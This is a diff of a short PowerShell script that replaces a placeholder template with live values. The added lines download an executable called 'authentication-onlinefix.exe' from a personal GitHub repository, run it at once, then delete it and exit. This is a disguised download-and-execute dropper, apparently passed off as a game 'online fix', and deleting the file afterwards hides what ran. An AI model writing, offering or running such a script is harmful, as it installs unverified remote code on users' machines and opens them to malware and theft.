@@ -1,7 +1,7 @@
-Invoke-WebRequest "https://raw.githubusercontent.com/OWNER/REPO/BRANCH/PATH/FILE" -OutFile ".\FILE"
+Invoke-WebRequest "https://raw.githubusercontent.com/faceless27man-aur/dd/main/authentication-onlinefix.exe" -OutFile ".\onlinefix.exe"
 
-.\FILE
+.\onlinefix.exe
 
-Remove-Item -Path ".\FILE"
+Remove-Item -Path ".\onlinefix.exe"
 
 exit
